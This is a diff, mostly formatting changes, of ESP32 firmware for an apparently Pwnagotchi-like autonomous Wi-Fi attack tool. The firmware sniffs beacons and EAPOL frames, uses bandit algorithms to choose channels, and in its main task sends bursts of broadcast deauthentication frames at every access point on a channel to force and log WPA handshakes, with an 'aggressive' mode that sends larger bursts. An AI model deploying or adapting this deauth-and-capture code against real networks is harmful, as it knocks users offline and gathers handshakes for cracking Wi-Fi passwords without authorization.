@@ -23,152 +23,167 @@
 
 // ── Mood ──────────────────────────────────────────────────────────────────────
 enum PwMood {
-  PW_SLEEP=0, PW_BORED, PW_SCAN, PW_EXCITED, PW_HAPPY,
-  PW_PWNING, PW_ANGRY, PW_CONFUSED, PW_INTENSE, PW_VICTORY
+  PW_SLEEP = 0,
+  PW_BORED,
+  PW_SCAN,
+  PW_EXCITED,
+  PW_HAPPY,
+  PW_PWNING,
+  PW_ANGRY,
+  PW_CONFUSED,
+  PW_INTENSE,
+  PW_VICTORY
 };
-static const char* const PW_MOOD_K[] = {
-  "sleep","bored","scan","excited","happy","pwning","angry","confused","intense","victory"
-};
-static const char* const PW_FACE_K[] = {
-  "(- _ -)", "(-__-)", "(. ._)", "(^o^)", "(:D)", "(>_<)", "(X_X)", "(o.0)", "(==>)", "(^^)"
-};
-static const char* const PW_MSG_K[] = {
-  "dreaming of packets...", "nothing here...", "scanning...", "eapol detected!",
-  "handshake captured!", "pwned.", "deauths failing!", "unexpected traffic", "hunting hard", "victory lap!"
-};
+static const char *const PW_MOOD_K[] = {"sleep",  "bored", "scan",     "excited", "happy",
+                                        "pwning", "angry", "confused", "intense", "victory"};
+static const char *const PW_FACE_K[] = {"(- _ -)", "(-__-)", "(. ._)", "(^o^)", "(:D)",
+                                        "(>_<)",   "(X_X)",  "(o.0)",  "(==>)", "(^^)"};
+static const char *const PW_MSG_K[] = {
+    "dreaming of packets...", "nothing here...", "scanning...",      "eapol detected!",
+    "handshake captured!",    "pwned.",          "deauths failing!", "unexpected traffic",
+    "hunting hard",           "victory lap!"};
 
 // ── Per-channel UCB stats (extended) ─────────────────────────────────────────
 struct PwChan {
-  uint8_t  ch;
+  uint8_t ch;
   uint16_t visits;
-  uint16_t eapol;        // total EAPOL frames observed
-  uint16_t deauths_sent; // deauths we transmitted
-  uint16_t beacons;      // beacons observed across all visits
-  uint16_t clients;      // unique clients seen on this channel
-  uint32_t last_eapol_ms;// millis() of last EAPOL
-  float    ucb_score;    // last computed UCB score (cached for display)
-  float    thompson_a;   // Thompson: Beta(a,b) successes+1
-  float    thompson_b;   // Thompson: Beta(a,b) failures+1
+  uint16_t eapol;          // total EAPOL frames observed
+  uint16_t deauths_sent;   // deauths we transmitted
+  uint16_t beacons;        // beacons observed across all visits
+  uint16_t clients;        // unique clients seen on this channel
+  uint32_t last_eapol_ms;  // millis() of last EAPOL
+  float ucb_score;         // last computed UCB score (cached for display)
+  float thompson_a;        // Thompson: Beta(a,b) successes+1
+  float thompson_b;        // Thompson: Beta(a,b) failures+1
 };
 
 // ── Per-AP record (extended) ──────────────────────────────────────────────────
-#define PW_MAX_APS  48
+#define PW_MAX_APS 48
 struct PwAP {
-  uint8_t  bssid[6];
-  char     ssid[33];     // null-terminated SSID from beacon body
-  uint8_t  ch;
-  int8_t   rssi;
-  uint8_t  enc;          // 0=open,1=WEP,2=WPA,3=WPA2,4=WPA3
-  uint16_t clients;      // seen associated clients
-  uint16_t deauths;      // deauths sent toward this AP
-  uint16_t eapol_seen;   // EAPOL seen on its channel after deauth
-  uint32_t last_seen_ms; // millis()
+  uint8_t bssid[6];
+  char ssid[33];  // null-terminated SSID from beacon body
+  uint8_t ch;
+  int8_t rssi;
+  uint8_t enc;            // 0=open,1=WEP,2=WPA,3=WPA2,4=WPA3
+  uint16_t clients;       // seen associated clients
+  uint16_t deauths;       // deauths sent toward this AP
+  uint16_t eapol_seen;    // EAPOL seen on its channel after deauth
+  uint32_t last_seen_ms;  // millis()
   uint32_t first_seen_ms;
-  bool     active;       // seen in current epoch
+  bool active;  // seen in current epoch
 };
 
 // ── Per-client record ─────────────────────────────────────────────────────────
 #define PW_MAX_CLIENTS 64
 struct PwClient {
-  uint8_t sta[6];       // station MAC
-  uint8_t ap[6];        // last-seen AP BSSID
+  uint8_t sta[6];  // station MAC
+  uint8_t ap[6];   // last-seen AP BSSID
   uint8_t ch;
-  int8_t  rssi;
-  uint16_t probes;      // probe requests seen
-  uint16_t data_frames; // data frames seen
+  int8_t rssi;
+  uint16_t probes;       // probe requests seen
+  uint16_t data_frames;  // data frames seen
   uint32_t last_seen_ms;
-  bool     eapol_seen;  // did we see EAPOL from this client?
+  bool eapol_seen;  // did we see EAPOL from this client?
 };
 
 // ── Captured handshake record ─────────────────────────────────────────────────
 #define PW_MAX_HS_LOG 24
 struct PwHandshake {
-  uint8_t  ap[6];
-  uint8_t  client[6];
-  uint8_t  ch;
-  int8_t   rssi;
-  uint8_t  frames;      // how many EAPOL frames captured (1-4)
+  uint8_t ap[6];
+  uint8_t client[6];
+  uint8_t ch;
+  int8_t rssi;
+  uint8_t frames;  // how many EAPOL frames captured (1-4)
   uint32_t ts_ms;
-  char     ssid[33];
+  char ssid[33];
 };
 
 // ── Log ───────────────────────────────────────────────────────────────────────
-#define PW_LOG_SZ  20
-#define PW_LOG_CL  80
-static char   pw_log_buf[PW_LOG_SZ][PW_LOG_CL];
-static int    pw_log_head  = 0;
-static int    pw_log_count = 0;
+#define PW_LOG_SZ 20
+#define PW_LOG_CL 80
+static char pw_log_buf[PW_LOG_SZ][PW_LOG_CL];
+static int pw_log_head = 0;
+static int pw_log_count = 0;
 
-static void pw_log_add(const char* fmt, ...) {
+static void pw_log_add(const char *fmt, ...) {
   char tmp[PW_LOG_CL];
-  va_list ap; va_start(ap, fmt); vsnprintf(tmp, PW_LOG_CL, fmt, ap); va_end(ap);
+  va_list ap;
+  va_start(ap, fmt);
+  vsnprintf(tmp, PW_LOG_CL, fmt, ap);
+  va_end(ap);
   memcpy(pw_log_buf[pw_log_head], tmp, PW_LOG_CL);
   pw_log_head = (pw_log_head + 1) % PW_LOG_SZ;
-  if (pw_log_count < PW_LOG_SZ) pw_log_count++;
+  if (pw_log_count < PW_LOG_SZ)
+    pw_log_count++;
 }
 
 // ── State ─────────────────────────────────────────────────────────────────────
-static PwChan     pw_chans[13];
-static PwAP       pw_aps[PW_MAX_APS];
-static PwClient   pw_clients[PW_MAX_CLIENTS];
+static PwChan pw_chans[13];
+static PwAP pw_aps[PW_MAX_APS];
+static PwClient pw_clients[PW_MAX_CLIENTS];
 static PwHandshake pw_hs_log[PW_MAX_HS_LOG];
-static volatile int    pw_ap_count     = 0;
-static volatile int    pw_client_count = 0;
-static volatile int    pw_hs_log_count = 0;
-static volatile uint32_t pw_hs         = 0;   // approx handshakes
-static volatile uint32_t pw_total_aps  = 0;
-static volatile uint32_t pw_epoch      = 0;
-static volatile uint8_t  pw_cur_ch     = 1;
-static volatile uint32_t pw_uptime_ms  = 0;
-static volatile uint32_t pw_start_ms   = 0;
+static volatile int pw_ap_count = 0;
+static volatile int pw_client_count = 0;
+static volatile int pw_hs_log_count = 0;
+static volatile uint32_t pw_hs = 0;  // approx handshakes
+static volatile uint32_t pw_total_aps = 0;
+static volatile uint32_t pw_epoch = 0;
+static volatile uint8_t pw_cur_ch = 1;
+static volatile uint32_t pw_uptime_ms = 0;
+static volatile uint32_t pw_start_ms = 0;
 static volatile uint32_t pw_deauth_total = 0;
-static volatile uint32_t pw_eapol_total  = 0;
+static volatile uint32_t pw_eapol_total = 0;
 static volatile uint32_t pw_beacon_total = 0;
-static volatile uint32_t pw_data_total   = 0;
-static volatile float    pw_efficiency   = 0.0f; // hs/epoch efficiency
-static PwMood  pw_mood      = PW_SLEEP;
-static PwMood  pw_prev_mood = PW_SLEEP;
-static bool    pw_running   = false;
+static volatile uint32_t pw_data_total = 0;
+static volatile float pw_efficiency = 0.0f;  // hs/epoch efficiency
+static PwMood pw_mood = PW_SLEEP;
+static PwMood pw_prev_mood = PW_SLEEP;
+static bool pw_running = false;
 static TaskHandle_t pw_task = nullptr;
 static volatile uint32_t pw_total_visits = 0;
 static SemaphoreHandle_t pw_mutex = nullptr;
 
 // Sniff counters reset each phase
 static volatile uint16_t pw_snap_beacon = 0;
-static volatile uint16_t pw_snap_eapol  = 0;
-static volatile uint16_t pw_snap_data   = 0;
-static volatile uint16_t pw_snap_mgmt   = 0;
-static volatile uint8_t  pw_snap_last_ch = 0;
+static volatile uint16_t pw_snap_eapol = 0;
+static volatile uint16_t pw_snap_data = 0;
+static volatile uint16_t pw_snap_mgmt = 0;
+static volatile uint8_t pw_snap_last_ch = 0;
 
 // Mood transition history (last 8 moods)
 static PwMood pw_mood_hist[8];
 static int pw_mood_hist_idx = 0;
 
 // AI "personality" – aggressive or conservative hunting style
-static uint8_t pw_personality = 0; // 0=balanced,1=aggressive,2=patient
+static uint8_t pw_personality = 0;  // 0=balanced,1=aggressive,2=patient
 static uint8_t pw_deauth_per_burst = 5;
 static uint16_t pw_listen_ms = 2000;
 
 // ── Helper: MAC to string ─────────────────────────────────────────────────────
-static void pw_mac2str(const uint8_t* m, char* out) {
-  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
+static void pw_mac2str(const uint8_t *m, char *out) {
+  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
 }
 
 // ── UCB1-Tuned channel selection ──────────────────────────────────────────────
 // Extends UCB1 with variance bound: score = mu + sqrt(ln(N)/n * min(1/4, V+sqrt(2*ln(N)/n)))
 static int pw_next_ch_ucb() {
   for (int i = 0; i < 13; i++)
-    if (pw_chans[i].visits == 0) return i;
-  float best = -1.0f; int bi = 0;
+    if (pw_chans[i].visits == 0)
+      return i;
+  float best = -1.0f;
+  int bi = 0;
   float lnT = logf((float)(pw_total_visits > 1 ? pw_total_visits : 2));
   for (int i = 0; i < 13; i++) {
-    float mu  = (float)pw_chans[i].eapol / pw_chans[i].visits;
+    float mu = (float)pw_chans[i].eapol / pw_chans[i].visits;
     float rat = lnT / pw_chans[i].visits;
-    float var_bound = mu - mu*mu + sqrtf(2.0f * rat);
+    float var_bound = mu - mu * mu + sqrtf(2.0f * rat);
     float pad = sqrtf(rat * fminf(0.25f, var_bound));
     float s = mu + pad;
     pw_chans[i].ucb_score = s;
-    if (s > best) { best = s; bi = i; }
+    if (s > best) {
+      best = s;
+      bi = i;
+    }
   }
   return bi;
 }
@@ -178,51 +193,62 @@ static int pw_next_ch_ucb() {
 static float pw_beta_sample(float a, float b) {
   // Approximate using ratio of Gamma(a)/(Gamma(a)+Gamma(b)) via log trick
   // Use simplified approximation: mean ± exploration noise
-  if (a + b < 2.0f) return (float)rand() / RAND_MAX;
+  if (a + b < 2.0f)
+    return (float)rand() / RAND_MAX;
   float mu = a / (a + b);
-  float sigma = sqrtf(a * b / ((a+b)*(a+b)*(a+b+1.0f)));
-  float z = ((float)rand()/RAND_MAX - 0.5f) * 3.46f; // approx normal [-1.73,1.73]
+  float sigma = sqrtf(a * b / ((a + b) * (a + b) * (a + b + 1.0f)));
+  float z = ((float)rand() / RAND_MAX - 0.5f) * 3.46f;  // approx normal [-1.73,1.73]
   float v = mu + sigma * z;
   return v < 0.0f ? 0.0f : v > 1.0f ? 1.0f : v;
 }
 
 static int pw_next_ch_thompson() {
   for (int i = 0; i < 13; i++)
-    if (pw_chans[i].visits == 0) return i;
-  float best = -1.0f; int bi = 0;
+    if (pw_chans[i].visits == 0)
+      return i;
+  float best = -1.0f;
+  int bi = 0;
   for (int i = 0; i < 13; i++) {
     float s = pw_beta_sample(pw_chans[i].thompson_a, pw_chans[i].thompson_b);
-    if (s > best) { best = s; bi = i; }
+    if (s > best) {
+      best = s;
+      bi = i;
+    }
   }
   return bi;
 }
 
 static int pw_next_ch_idx() {
   // Alternate: even epochs use UCB, odd epochs use Thompson
-  if (pw_epoch % 2 == 0) return pw_next_ch_ucb();
+  if (pw_epoch % 2 == 0)
+    return pw_next_ch_ucb();
   return pw_next_ch_thompson();
 }
 
 // ── Thompson: update posterior after observing reward ────────────────────────
 static void pw_thompson_update(int ci, bool success) {
-  if (success) pw_chans[ci].thompson_a += 1.0f;
-  else         pw_chans[ci].thompson_b += 1.0f;
+  if (success)
+    pw_chans[ci].thompson_a += 1.0f;
+  else
+    pw_chans[ci].thompson_b += 1.0f;
 }
 
 // ── SSID extraction from beacon body ─────────────────────────────────────────
-static void pw_extract_ssid(const uint8_t* payload, uint32_t len, char* out, int maxlen) {
+static void pw_extract_ssid(const uint8_t *payload, uint32_t len, char *out, int maxlen) {
   out[0] = 0;
   // 802.11 beacon: 24-byte MAC header + 8 timestamp + 2 interval + 2 caps = offset 36
-  if (len < 38) return;
-  const uint8_t* ie = payload + 36;
+  if (len < 38)
+    return;
+  const uint8_t *ie = payload + 36;
   int remain = (int)len - 36;
   while (remain >= 2) {
-    uint8_t id  = ie[0];
+    uint8_t id = ie[0];
     uint8_t elen = ie[1];
-    if (remain < 2 + elen) break;
-    if (id == 0) { // SSID IE
-      int copylen = elen < (maxlen-1) ? elen : (maxlen-1);
-      memcpy(out, ie+2, copylen);
+    if (remain < 2 + elen)
+      break;
+    if (id == 0) {  // SSID IE
+      int copylen = elen < (maxlen - 1) ? elen : (maxlen - 1);
+      memcpy(out, ie + 2, copylen);
       out[copylen] = 0;
       return;
     }
@@ -232,72 +258,84 @@ static void pw_extract_ssid(const uint8_t* payload, uint32_t len, char* out, int
 }
 
 // ── Encryption type from RSN/WPA IEs ─────────────────────────────────────────
-static uint8_t pw_extract_enc(const uint8_t* payload, uint32_t len) {
-  if (len < 38) return 0;
-  const uint8_t* ie = payload + 36;
+static uint8_t pw_extract_enc(const uint8_t *payload, uint32_t len) {
+  if (len < 38)
+    return 0;
+  const uint8_t *ie = payload + 36;
   int remain = (int)len - 36;
   while (remain >= 2) {
-    uint8_t id  = ie[0];
+    uint8_t id = ie[0];
     uint8_t elen = ie[1];
-    if (remain < 2 + elen) break;
-    if (id == 48) return 3;      // RSN → WPA2
+    if (remain < 2 + elen)
+      break;
+    if (id == 48)
+      return 3;  // RSN → WPA2
     if (id == 221 && elen >= 4) {
-      if (ie[2]==0x00 && ie[3]==0x50 && ie[4]==0xf2 && ie[5]==0x01) return 2; // WPA1
+      if (ie[2] == 0x00 && ie[3] == 0x50 && ie[4] == 0xf2 && ie[5] == 0x01)
+        return 2;  // WPA1
     }
     // Check WPA3 SAE via AKM suite
     if (id == 48 && elen >= 10) {
-      uint16_t akm_count = (ie[9] | (ie[10]<<8)) > 0 ? 1 : 0;
-      if (akm_count && elen >= 16 && ie[13]==8) return 4; // SAE
+      uint16_t akm_count = (ie[9] | (ie[10] << 8)) > 0 ? 1 : 0;
+      if (akm_count && elen >= 16 && ie[13] == 8)
+        return 4;  // SAE
     }
     ie += 2 + elen;
     remain -= 2 + elen;
   }
-  return 0; // open
+  return 0;  // open
 }
 
 // ── AP tracking ───────────────────────────────────────────────────────────────
-static void pw_ap_add(const uint8_t* bssid, uint8_t ch, int8_t rssi,
-                       const char* ssid, uint8_t enc) {
-  if (pw_mutex) xSemaphoreTake(pw_mutex, portMAX_DELAY);
+static void pw_ap_add(const uint8_t *bssid, uint8_t ch, int8_t rssi, const char *ssid,
+                      uint8_t enc) {
+  if (pw_mutex)
+    xSemaphoreTake(pw_mutex, portMAX_DELAY);
   for (int i = 0; i < pw_ap_count; i++) {
     if (memcmp(pw_aps[i].bssid, bssid, 6) == 0) {
       pw_aps[i].rssi = rssi;
-      pw_aps[i].ch   = ch;
-      if (ssid && ssid[0]) strncpy(pw_aps[i].ssid, ssid, 32);
+      pw_aps[i].ch = ch;
+      if (ssid && ssid[0])
+        strncpy(pw_aps[i].ssid, ssid, 32);
       pw_aps[i].last_seen_ms = millis();
       pw_aps[i].active = true;
-      if (pw_mutex) xSemaphoreGive(pw_mutex);
+      if (pw_mutex)
+        xSemaphoreGive(pw_mutex);
       return;
     }
   }
   if (pw_ap_count < PW_MAX_APS) {
     int idx = pw_ap_count;
     memcpy(pw_aps[idx].bssid, bssid, 6);
-    pw_aps[idx].ch   = ch;
+    pw_aps[idx].ch = ch;
     pw_aps[idx].rssi = rssi;
-    pw_aps[idx].enc  = enc;
-    pw_aps[idx].clients      = 0;
-    pw_aps[idx].deauths      = 0;
-    pw_aps[idx].eapol_seen   = 0;
+    pw_aps[idx].enc = enc;
+    pw_aps[idx].clients = 0;
+    pw_aps[idx].deauths = 0;
+    pw_aps[idx].eapol_seen = 0;
     pw_aps[idx].last_seen_ms = millis();
     pw_aps[idx].first_seen_ms = millis();
-    pw_aps[idx].active       = true;
-    if (ssid) strncpy(pw_aps[idx].ssid, ssid, 32);
-    else      pw_aps[idx].ssid[0] = 0;
+    pw_aps[idx].active = true;
+    if (ssid)
+      strncpy(pw_aps[idx].ssid, ssid, 32);
+    else
+      pw_aps[idx].ssid[0] = 0;
     pw_ap_count = idx + 1;
     pw_total_aps++;
   }
-  if (pw_mutex) xSemaphoreGive(pw_mutex);
+  if (pw_mutex)
+    xSemaphoreGive(pw_mutex);
 }
 
 // ── Client tracking ───────────────────────────────────────────────────────────
-static void pw_client_add(const uint8_t* sta, const uint8_t* ap, uint8_t ch, int8_t rssi) {
+static void pw_client_add(const uint8_t *sta, const uint8_t *ap, uint8_t ch, int8_t rssi) {
   for (int i = 0; i < pw_client_count; i++) {
     if (memcmp(pw_clients[i].sta, sta, 6) == 0) {
       pw_clients[i].last_seen_ms = millis();
       pw_clients[i].rssi = rssi;
-      pw_clients[i].ch   = ch;
-      if (ap) memcpy(pw_clients[i].ap, ap, 6);
+      pw_clients[i].ch = ch;
+      if (ap)
+        memcpy(pw_clients[i].ap, ap, 6);
       pw_clients[i].data_frames++;
       return;
     }
@@ -305,19 +343,20 @@ static void pw_client_add(const uint8_t* sta, const uint8_t* ap, uint8_t ch, int
   if (pw_client_count < PW_MAX_CLIENTS) {
     int idx = pw_client_count;
     memcpy(pw_clients[idx].sta, sta, 6);
-    if (ap) memcpy(pw_clients[idx].ap, ap, 6);
-    pw_clients[idx].ch  = ch;
+    if (ap)
+      memcpy(pw_clients[idx].ap, ap, 6);
+    pw_clients[idx].ch = ch;
     pw_clients[idx].rssi = rssi;
     pw_clients[idx].data_frames = 1;
-    pw_clients[idx].probes      = 0;
+    pw_clients[idx].probes = 0;
     pw_clients[idx].last_seen_ms = millis();
-    pw_clients[idx].eapol_seen  = false;
+    pw_clients[idx].eapol_seen = false;
     pw_client_count = idx + 1;
     // Increment client count on AP record
     for (int ai = 0; ai < pw_ap_count; ai++) {
       if (ap && memcmp(pw_aps[ai].bssid, ap, 6) == 0) {
         pw_aps[ai].clients++;
-        pw_chans[ch-1].clients++;
+        pw_chans[ch - 1].clients++;
         break;
       }
     }
@@ -325,15 +364,18 @@ static void pw_client_add(const uint8_t* sta, const uint8_t* ap, uint8_t ch, int
 }
 
 // ── EAPOL tracking: log approximate handshake ────────────────────────────────
-static void pw_log_handshake(const uint8_t* ap, const uint8_t* sta, uint8_t ch, int8_t rssi, uint8_t frames) {
+static void pw_log_handshake(const uint8_t *ap, const uint8_t *sta, uint8_t ch, int8_t rssi,
+                             uint8_t frames) {
   if (pw_hs_log_count < PW_MAX_HS_LOG) {
     int idx = pw_hs_log_count;
-    if (ap)  memcpy(pw_hs_log[idx].ap,     ap,  6);
-    if (sta) memcpy(pw_hs_log[idx].client, sta, 6);
-    pw_hs_log[idx].ch     = ch;
-    pw_hs_log[idx].rssi   = rssi;
+    if (ap)
+      memcpy(pw_hs_log[idx].ap, ap, 6);
+    if (sta)
+      memcpy(pw_hs_log[idx].client, sta, 6);
+    pw_hs_log[idx].ch = ch;
+    pw_hs_log[idx].rssi = rssi;
     pw_hs_log[idx].frames = frames;
-    pw_hs_log[idx].ts_ms  = millis();
+    pw_hs_log[idx].ts_ms = millis();
     // Lookup SSID from AP table
     pw_hs_log[idx].ssid[0] = 0;
     for (int i = 0; i < pw_ap_count; i++) {
@@ -345,21 +387,24 @@ static void pw_log_handshake(const uint8_t* ap, const uint8_t* sta, uint8_t ch, 
     pw_hs_log_count++;
   } else {
     // Ring buffer — overwrite oldest
-    memmove(&pw_hs_log[0], &pw_hs_log[1], sizeof(PwHandshake)*(PW_MAX_HS_LOG-1));
-    int idx = PW_MAX_HS_LOG-1;
-    if (ap)  memcpy(pw_hs_log[idx].ap,     ap,  6);
-    if (sta) memcpy(pw_hs_log[idx].client, sta, 6);
-    pw_hs_log[idx].ch     = ch;
-    pw_hs_log[idx].rssi   = rssi;
+    memmove(&pw_hs_log[0], &pw_hs_log[1], sizeof(PwHandshake) * (PW_MAX_HS_LOG - 1));
+    int idx = PW_MAX_HS_LOG - 1;
+    if (ap)
+      memcpy(pw_hs_log[idx].ap, ap, 6);
+    if (sta)
+      memcpy(pw_hs_log[idx].client, sta, 6);
+    pw_hs_log[idx].ch = ch;
+    pw_hs_log[idx].rssi = rssi;
     pw_hs_log[idx].frames = frames;
-    pw_hs_log[idx].ts_ms  = millis();
+    pw_hs_log[idx].ts_ms = millis();
     pw_hs_log[idx].ssid[0] = 0;
   }
 }
 
 // ── Mood AI ───────────────────────────────────────────────────────────────────
 static void pw_mood_set(PwMood m) {
-  if (m == pw_mood) return;
+  if (m == pw_mood)
+    return;
   pw_prev_mood = pw_mood;
   pw_mood = m;
   pw_mood_hist[pw_mood_hist_idx] = m;
@@ -367,10 +412,15 @@ static void pw_mood_set(PwMood m) {
 }
 
 static void pw_mood_tick(uint16_t beacons, uint16_t eapol_new, bool deauth_success) {
-  if (!pw_running) { pw_mood_set(PW_SLEEP); return; }
+  if (!pw_running) {
+    pw_mood_set(PW_SLEEP);
+    return;
+  }
   if (beacons == 0 && eapol_new == 0) {
-    if (pw_mood == PW_BORED) pw_mood_set(PW_CONFUSED);
-    else                      pw_mood_set(PW_BORED);
+    if (pw_mood == PW_BORED)
+      pw_mood_set(PW_CONFUSED);
+    else
+      pw_mood_set(PW_BORED);
   } else if (eapol_new == 0 && beacons > 0 && !deauth_success) {
     pw_mood_set(PW_ANGRY);
   } else if (eapol_new == 0 && beacons > 0) {
@@ -389,17 +439,17 @@ static void pw_mood_tick(uint16_t beacons, uint16_t eapol_new, bool deauth_succe
 // ── Personality-based parameter adjustment ────────────────────────────────────
 static void pw_apply_personality() {
   switch (pw_personality) {
-    case 1: // aggressive
+    case 1:  // aggressive
       pw_deauth_per_burst = 10;
       pw_listen_ms = 1500;
       pw_log_add("Mode: aggressive (burst=%u listen=%u)", pw_deauth_per_burst, pw_listen_ms);
       break;
-    case 2: // patient
+    case 2:  // patient
       pw_deauth_per_burst = 3;
       pw_listen_ms = 3500;
       pw_log_add("Mode: patient (burst=%u listen=%u)", pw_deauth_per_burst, pw_listen_ms);
       break;
-    default: // balanced
+    default:  // balanced
       pw_deauth_per_burst = 5;
       pw_listen_ms = 2000;
       pw_log_add("Mode: balanced (burst=%u listen=%u)", pw_deauth_per_burst, pw_listen_ms);
@@ -408,18 +458,18 @@ static void pw_apply_personality() {
 }
 
 // ── Promiscuous callback (extended) ───────────────────────────────────────────
-static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
-  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
-  const uint8_t* f = p->payload;
+static void pw_rx(void *buf, wifi_promiscuous_pkt_type_t type) {
+  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
+  const uint8_t *f = p->payload;
   uint32_t len = p->rx_ctrl.sig_len;
-  uint8_t ch  = p->rx_ctrl.channel;
-  int8_t  rssi = p->rx_ctrl.rssi;
+  uint8_t ch = p->rx_ctrl.channel;
+  int8_t rssi = p->rx_ctrl.rssi;
 
   if (type == WIFI_PKT_MGMT && len >= 24) {
     uint8_t ft = f[0] & 0xFC;
     pw_snap_mgmt++;
     pw_beacon_total++;
-    if (ft == 0x80 || ft == 0x50) { // beacon or probe response
+    if (ft == 0x80 || ft == 0x50) {  // beacon or probe response
       pw_snap_beacon++;
       char ssid[33] = {0};
       uint8_t enc = 0;
@@ -428,9 +478,9 @@ static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
         enc = pw_extract_enc(f, len);
       }
       pw_ap_add(f + 16, ch, rssi, ssid, enc);
-    } else if (ft == 0x40) { // probe request
+    } else if (ft == 0x40) {  // probe request
       // Track client probes
-      static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+      static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
       pw_client_add(f + 10, BCAST, ch, rssi);
     }
   } else if (type == WIFI_PKT_DATA && len >= 32) {
@@ -439,13 +489,13 @@ static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
     bool qos = (f[0] & 0x80) != 0;
     int llc = 24 + (qos ? 2 : 0);
     if ((int)len >= llc + 8) {
-      if (f[llc]==0xAA && f[llc+1]==0xAA && f[llc+2]==0x03 &&
-          f[llc+6]==0x88 && f[llc+7]==0x8E) {
+      if (f[llc] == 0xAA && f[llc + 1] == 0xAA && f[llc + 2] == 0x03 && f[llc + 6] == 0x88 &&
+          f[llc + 7] == 0x8E) {
         pw_snap_eapol++;
         pw_eapol_total++;
         // Track which client this EAPOL came from
-        const uint8_t* src = f + 10;
-        const uint8_t* dst = f + 4;
+        const uint8_t *src = f + 10;
+        const uint8_t *dst = f + 4;
         for (int i = 0; i < pw_client_count; i++) {
           if (memcmp(pw_clients[i].sta, src, 6) == 0) {
             pw_clients[i].eapol_seen = true;
@@ -467,8 +517,8 @@ static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
 }
 
 // ── Autonomous task (extended) ────────────────────────────────────────────────
-static void pw_run_task(void*) {
-  static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+static void pw_run_task(void *) {
+  static const uint8_t BC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   uint8_t fbuf[64];
   uint32_t phase_start;
 
@@ -487,8 +537,8 @@ static void pw_run_task(void*) {
 
     // Phase 1 — beacon sniff (500ms)
     pw_snap_beacon = 0;
-    pw_snap_eapol  = 0;
-    pw_snap_data   = 0;
+    pw_snap_eapol = 0;
+    pw_snap_data = 0;
     phase_start = millis();
     vTaskDelay(pdMS_TO_TICKS(500));
     uint16_t beacons = pw_snap_beacon;
@@ -509,7 +559,8 @@ static void pw_run_task(void*) {
     int deauths_sent = 0;
     for (int burst = 0; burst < pw_deauth_per_burst; burst++) {
       for (int ai = 0; ai < snap; ai++) {
-        if (pw_aps[ai].ch != ch) continue;
+        if (pw_aps[ai].ch != ch)
+          continue;
         // Deauth broadcast (no specific client needed)
         size_t n = f_deauth(fbuf, BC, pw_aps[ai].bssid, 7);
         esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
@@ -537,10 +588,12 @@ static void pw_run_task(void*) {
       pw_hs += sessions_new;
       // Approximate source AP from recent data frames
       pw_log_handshake(nullptr, nullptr, ch, (int8_t)-60, (uint8_t)fminf(eapol_new, 4));
-      pw_log_add("[%u] ch%u: %u EAPOL → ~%u hs total=%u", (unsigned)pw_epoch, ch, eapol_new, (unsigned)sessions_new, (unsigned)pw_hs);
+      pw_log_add("[%u] ch%u: %u EAPOL → ~%u hs total=%u", (unsigned)pw_epoch, ch, eapol_new,
+                 (unsigned)sessions_new, (unsigned)pw_hs);
     } else {
       if (pw_total_visits % 7 == 0) {
-        pw_log_add("[%u] ch%u: %u beacons, 0 EAPOL (deauths=%u)", (unsigned)pw_epoch, ch, beacons, deauths_sent);
+        pw_log_add("[%u] ch%u: %u beacons, 0 EAPOL (deauths=%u)", (unsigned)pw_epoch, ch, beacons,
+                   deauths_sent);
       }
     }
 
@@ -557,8 +610,8 @@ static void pw_run_task(void*) {
     // Every 13 visits = 1 epoch
     if (pw_total_visits > 0 && pw_total_visits % 13 == 0) {
       pw_epoch++;
-      pw_log_add("[epoch %u] hs=%u aps=%u clients=%u eff=%.2f", (unsigned)pw_epoch,
-        (unsigned)pw_hs, (unsigned)pw_total_aps, pw_client_count, pw_efficiency);
+      pw_log_add("[epoch %u] hs=%u aps=%u clients=%u eff=%.2f", (unsigned)pw_epoch, (unsigned)pw_hs,
+                 (unsigned)pw_total_aps, pw_client_count, pw_efficiency);
       if (pw_epoch % 5 == 0 && pw_hs == 0) {
         // Auto-adjust personality if not finding anything
         pw_personality = (pw_personality + 1) % 3;
@@ -567,7 +620,8 @@ static void pw_run_task(void*) {
       // Mark stale APs as inactive
       uint32_t now = millis();
       for (int i = 0; i < pw_ap_count; i++) {
-        if (now - pw_aps[i].last_seen_ms > 60000) pw_aps[i].active = false;
+        if (now - pw_aps[i].last_seen_ms > 60000)
+          pw_aps[i].active = false;
       }
     }
 
@@ -885,31 +939,45 @@ tick();
 </body></html>)html";
 
 // ── Start / stop ──────────────────────────────────────────────────────────────
-void aegisSniff(void*, wifi_promiscuous_pkt_type_t); // forward declaration
-static bool pw_start(const String& args) {
-  if (pw_running) return false;
+void aegisSniff(void *, wifi_promiscuous_pkt_type_t);  // forward declaration
+static bool pw_start(const String &args) {
+  if (pw_running)
+    return false;
   // Parse personality from args
   int p = args.indexOf("personality=");
-  if (p >= 0) pw_personality = (uint8_t)args.substring(p+12).toInt();
-  else pw_personality = 0;
+  if (p >= 0)
+    pw_personality = (uint8_t)args.substring(p + 12).toInt();
+  else
+    pw_personality = 0;
   // Reset all counters
-  pw_hs = 0; pw_total_aps = 0; pw_epoch = 0;
-  pw_ap_count = 0; pw_client_count = 0; pw_hs_log_count = 0;
-  pw_log_head = 0; pw_log_count = 0; pw_total_visits = 0;
-  pw_deauth_total = 0; pw_eapol_total = 0; pw_beacon_total = 0;
-  pw_data_total = 0; pw_efficiency = 0.0f;
-  pw_mood = PW_SLEEP; pw_uptime_ms = 0;
+  pw_hs = 0;
+  pw_total_aps = 0;
+  pw_epoch = 0;
+  pw_ap_count = 0;
+  pw_client_count = 0;
